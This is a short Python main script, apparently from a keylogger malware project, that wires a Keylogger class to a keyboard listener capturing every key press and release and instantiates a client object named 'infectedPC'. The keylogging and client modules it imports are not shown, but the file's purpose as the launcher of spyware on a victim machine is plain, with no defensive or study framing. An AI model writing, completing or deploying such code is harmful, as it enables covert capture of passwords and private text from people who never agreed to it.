from client import *
from keylogV2 import *
from threading import Thread, Lock


def main():

    lock = Lock()
    keylog = Keylogger(lock)
    infectedPC = Client(lock)
    
    with Listener(on_press = keylog.on_press, on_release = keylog.on_release) as listener:
        listener.join()
    
     

if __name__ == "__main__":
    main()
